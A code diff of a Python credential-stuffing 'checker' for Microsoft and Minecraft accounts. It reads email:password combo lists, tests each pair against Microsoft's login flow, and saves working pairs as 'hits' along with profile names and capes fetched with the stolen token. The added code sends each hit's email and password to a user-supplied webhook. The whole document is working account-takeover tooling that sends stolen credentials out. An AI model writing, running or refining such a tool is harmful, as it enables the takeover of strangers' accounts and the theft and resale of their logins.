@@ -12,17 +12,10 @@ warnings.filterwarnings("ignore")
 class Config:
     def __init__(self):
         self.data = {
-            'hypixelname': True,
-            'hypixellevel': True,
-            'hypixelfirstlogin': True,
-            'hypixellastlogin': True,
-            'hypixelbwstars': True,
-            'hypixelsbcoins': False,
             'optifinecape': True,
             'access': False,
             'namechange': True,
-            'lastchanged': True,
-            'hypixelban': False
+            'lastchanged': True
         }
 
     def set(self, key, value):
@@ -32,110 +25,6 @@ class Config:
         return self.data.get(key, None)
 
 config = Config()
-
-class Capture:
-    def __init__(self, email, password, name, capes, uuid_val, token, type_val, res_dir):
-        self.email = email
-        self.password = password
-        self.name = name
-        self.capes = capes
-        self.uuid = uuid_val
-        self.token = token
-        self.type = type_val
-        self.res_dir = res_dir
-        self.hypixl = None
-        self.level = None
-        self.firstlogin = None
-        self.lastlogin = None
-        self.cape = None
-        self.access = None
-        self.sbcoins = None
-        self.bwstars = None
-        self.banned = None
-        self.namechanged = None
-        self.lastchanged = None
-
-    def builder(self):
-        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
-        if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
-        if self.level != None: message+=f"\nHypixel Level: {self.level}"
-        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
-        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
-        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
-        if self.access != None: message+=f"\nEmail Access: {self.access}"
-        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
-        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
-        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
-        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
-        return message+"\n============================\n"
-
-    def hypixel(self):
-        try:
-            tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, headers={'User-Agent':'Mozilla/5.0'}, verify=False, timeout=10).text
-            try: self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
-            except: pass
-            try: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
-            except: pass
-            try: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
-            except: pass
-            try: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
-            except: pass
-            try: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
-            except: pass
-        except: pass
-
-    def optifine(self):
-        try:
-            txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', verify=False, timeout=5).text
-            if "Not found" in txt: self.cape = "No"
-            else: self.cape = "Yes"
-        except: self.cape = "Unknown"
-    
-    def namechange(self):
-        try:
-            check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, verify=False, timeout=10)
-            if check.status_code == 200:
-                data = check.json()
-                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
-                created_at = data.get('createdAt')
-                if created_at:
-                    try:
-                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
-                    except ValueError:
-                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
-                    given_date = given_date.replace(tzinfo=timezone.utc)
-                    formatted = given_date.strftime("%m/%d/%Y")
-                    current_date = datetime.now(timezone.utc)
-                    difference = current_date - given_date
-                    years = difference.days // 365
-                    months = (difference.days % 365) // 30
-                    days = difference.days
-
-                    if years > 0:
-                        self.lastchanged = f"{years} years - {formatted}"
-                    elif months > 0:
-                        self.lastchanged = f"{months} months - {formatted}"
-                    else:
-                        self.lastchanged = f"{days} days - {formatted}"
-        except: pass
-
-    def handle(self):
-        hits_file = os.path.join(self.res_dir, "Hits.txt")
-        cap_file = os.path.join(self.res_dir, "Capture.txt")
-        
-        with open(hits_file, 'a', encoding='utf-8') as file: 
-            file.write(f"{self.email}:{self.password}\n")
-            
-        if self.name != 'N/A':
-            try: self.hypixel()
-            except: pass
-            try: self.optifine()
-            except: pass
-            try: self.namechange()
-            except: pass
-            
-        with open(cap_file, 'a', encoding='utf-8') as file: 
-            file.write(self.builder())
 
 def get_urlPost_sFTTag(session):
     try:
@@ -182,66 +71,8 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
         pass
     return "None", session
 
-def capture_mc(access_token, session, email, password, type_val, res_dir):
-    try:
-        r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, verify=False, timeout=10)
-        if r.status_code == 200:
-            data = r.json()
-            name = data.get("name", "N/A")
-            uuid_val = data.get("id", "N/A")
-            capes = ", ".join([cape.get("alias", "") for cape in data.get("capes", [])])
-            capt = Capture(email, password, name, capes, uuid_val, access_token, type_val, res_dir)
-            capt.handle()
-            print("[+] HIT CAPTURED SUCCESSFULLY!")
-        else:
-            with open(os.path.join(res_dir, "Valid_Mail.txt"), 'a', encoding='utf-8') as f:
-                f.write(f"{email}:{password}\n")
-    except Exception as ex:
-        print("Capture Error:", ex)
-
-def process_combo_line(line, res_dir):
-    if ":" not in line:
-        return
-    parts = line.strip().split(":", 1)
-    email = parts[0]
-    password = parts[1]
-    
-    print(f"[*] Trying account: {email}")
-    
-    session = requests.Session()
-    urlPost, sFTTag, session = get_urlPost_sFTTag(session)
-    if not urlPost or not sFTTag:
-        print("[-] Failed to get urlPost or sFTTag")
-        return
-    
-    token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
-    if token == "None":
-        print("[-] Microsoft login failed (Bad Password or Blocked).")
-        return
-    
-    print("[+] SUCCESS! Valid Microsoft Account Found (Hit)!")
-    
-    # Jaise hi token mile, usko seedha Hits aur Capture mein daal do
-    hits_file = os.path.join(res_dir, "Hits.txt")
-    cap_file = os.path.join(res_dir, "Capture.txt")
-    
-    with open(hits_file, 'a', encoding='utf-8') as file: 
-        file.write(f"{email}:{password}\n")
-        
-    # Try to fetch basic profile name if possible, otherwise write default
-    name = "Minecraft Account"
-    try:
-        r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=5)
-        if r.status_code == 200:
-            name = r.json().get("name", "Minecraft Account")
-    except:
-        pass
-        
-    with open(cap_file, 'a', encoding='utf-8') as file: 
-        file.write(f"Email: {email}\nPassword: {password}\nName: {name}\nAccount Type: Microsoft / Minecraft\n============================\n")
-
 # --- MAIN RUN FUNCTION CALLED BY app.py ---
-def run(input_path, output_path):
+def run(input_path, output_path, user_webhook=None):
     res_dir = os.path.dirname(output_path)
     os.makedirs(res_dir, exist_ok=True)
     
@@ -249,22 +80,93 @@ def run(input_path, output_path):
         return
 
     with open(input_path, 'r', encoding='utf-8', errors='replace') as f:
-        lines = f.readlines()
+        lines = [line.strip() for line in f if line.strip()]
+
+    hits_list = []
+    bad_list = []
+    capture_list = []
 
     for line in lines:
-        if line.strip():
-            process_combo_line(line, res_dir)
+        if ":" not in line:
+            continue
+        parts = line.strip().split(":", 1)
+        email = parts[0]
+        password = parts[1]
+        
+        print(f"[*] Trying account: {email}")
+        
+        session = requests.Session()
+        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
+        if not urlPost or not sFTTag:
+            print("[-] Failed to get urlPost or sFTTag (Bad)")
+            bad_list.append(line)
+            continue
+        
+        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
+        if token == "None":
+            print("[-] Microsoft login failed (Bad Password or Blocked).")
+            bad_list.append(line)
+            continue
+        
+        print("[+] SUCCESS! Valid Microsoft Account Found (Hit)!")
+        hits_list.append(line)
+        
+        name = "Minecraft Account"
+        cape_list = "None"
+        try:
+            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=5)
+            if r.status_code == 200:
+                data = r.json()
+                name = data.get("name", "Minecraft Account")
+                found_capes = [c.get("alias", "") for c in data.get("capes", [])]
+                if found_capes:
+                    cape_list = ", ".join(found_capes)
+        except:
+            pass
+        
+        cap_block = f"Email: {email}\nPassword: {password}\nName: {name}\nCapes: {cape_list}\nAccount Type: Minecraft Java\n============================\n"
+        capture_list.append(cap_block)
 
-    # Final results file generate karke write karna
-    summary_lines = []
-    for filename in ["Hits.txt", "Capture.txt", "Valid_Mail.txt"]:
-        fpath = os.path.join(res_dir, filename)
-        if os.path.exists(fpath):
-            with open(fpath, 'r', encoding='utf-8', errors='replace') as sf:
-                summary_lines.append(f"--- {filename} ---\n" + sf.read() + "\n")
+        # --- CLEAN DUAL WEBHOOK NOTIFICATION TRIGGER ---
+        try:
+            from app import send_hit_notification
+            send_hit_notification(
+                email=email,
+                password=password,
+                account_type="Minecraft Java",
+                capes=cape_list,
+                user_webhook_url=user_webhook
+            )
+        except Exception as e:
+            print(f"[ERROR] Failed to trigger webhook notification: {e}")
 
-    if not summary_lines:
-        summary_lines.append("Checking completed. No hits found or check output files.")
+    # Save individual Hits.txt for counting
+    hits_file_path = os.path.join(res_dir, "Hits.txt")
+    with open(hits_file_path, 'w', encoding='utf-8') as h_file:
+        h_file.write("\n".join(hits_list) + ("\n" if hits_list else ""))
 
-    with open(output_path, 'w', encoding='utf-8') as out:
-        out.writelines(summary_lines)
+    # --- STRUCTURED RESULTS.TXT FORMAT (UTF-8 Encoding Fixed) ---
+    final_output = []
+    
+    final_output.append("=== HITS [+] ===\n")
+    if hits_list:
+        final_output.extend([f"{h}\n" for h in hits_list])
+    else:
+        final_output.append("No hits found.\n")
+    
+    final_output.append("\n=== BAD [-] ===\n")
+    if bad_list:
+        final_output.extend([f"{b}\n" for b in bad_list])
+    else:
+        final_output.append("No bad combos.\n")
+        
+    final_output.append("\n=== CAPTURES ===\n")
+    if capture_list:
+        final_output.extend(capture_list)
+    else:
+        final_output.append("No captures available.\n")
+
+    # Ensure encoding is explicitly set to utf-8 so emojis don't break
+    with open(output_path, 'w', encoding='utf-8', errors='replace') as out:
+        out.writelines(final_output)
+
